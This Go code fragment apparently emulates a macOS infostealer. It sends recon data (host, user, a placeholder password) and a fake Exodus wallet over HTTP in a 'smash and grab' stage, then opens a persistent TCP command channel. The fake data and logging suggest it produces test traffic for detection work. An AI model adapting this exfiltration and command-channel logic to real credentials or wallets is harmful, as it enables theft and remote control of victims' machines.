		"tcp_port", TCPPort,
	)

	// Step 1: Initial "Smash and Grab" via HTTP
	e.Log.Info("stage_1_initial_exfiltration_starting", "method", "HTTP")

	recon := fmt.Sprintf("UUID: %s\nmacOS Password: password123\nHostname: %s\nUsername: %s", e.UUID, e.Hostname, e.User)
	e.Log.Info("recon_data_exfiltrating",
		"uuid", e.UUID,
		"hostname", e.Hostname,
		"username", e.User,
		"content", recon,
		"length", len(recon),
	)

	reconItem := e.buildMultiplexedItem("recon.txt", []byte(recon))
	e.postHTTP(reconItem, "init_recon")

	e.Log.Debug("stage_1_delay", "duration", "500ms")
	time.Sleep(500 * time.Millisecond)

	e.Log.Info("exodus_wallet_exfiltrating",
		"wallet_type", "Exodus",
		"contains", "mnemonic, seed, addresses, balances",
		"content", fakeExodusWallet,
	)

	lootItem := e.buildMultiplexedItem("exodus.wallet", []byte(fakeExodusWallet))
	e.postHTTP(lootItem, "init_loot")

	e.Log.Info("stage_1_completed", "method", "HTTP")

	// Step 2: Persistent Command Channel via TCP
	e.Log.Info("stage_2_persistent_channel_starting", "method", "TCP")
	e.runTCPChannel()
}
